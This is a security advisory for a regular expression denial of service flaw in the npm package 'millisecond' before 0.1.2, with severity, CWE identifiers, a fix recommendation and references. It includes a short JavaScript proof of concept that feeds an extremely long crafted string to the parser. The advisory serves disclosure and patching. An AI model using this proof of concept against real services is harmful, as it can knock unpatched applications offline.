# [M] Regular Expression Denial of Service in millisecond

## Summary
Severity: Medium
Advisory: GHSA-m489-xr35-fjxr
CWE: CWE-1333, CWE-400
Ecosystem: npm
Published: 2021-09-22
Source: https://github.com/advisories/GHSA-m489-xr35-fjxr
Type: github-advisory

## Affected
- npm: `millisecond` — affected >=0 <0.1.2

## Details
Versions of `millisecond` prior to 0.1.2 are affected by a regular expression denial of service vulnerability when extremely long version strings are parsed.


## Proof of concept
```
var ms = require('millisecond');
var genstr = function (len, chr) {
   var result = "";
   for (i=0; i<=len; i++) {
       result = result + chr;
   }

   return result;
}

ms(genstr(process.argv[2], "5") + " minutea");
```


## Recommendation

Update to version 0.1.2 or later.

## References
- https://github.com/unshiftio/millisecond/pull/4
- https://www.npmjs.com/advisories/59
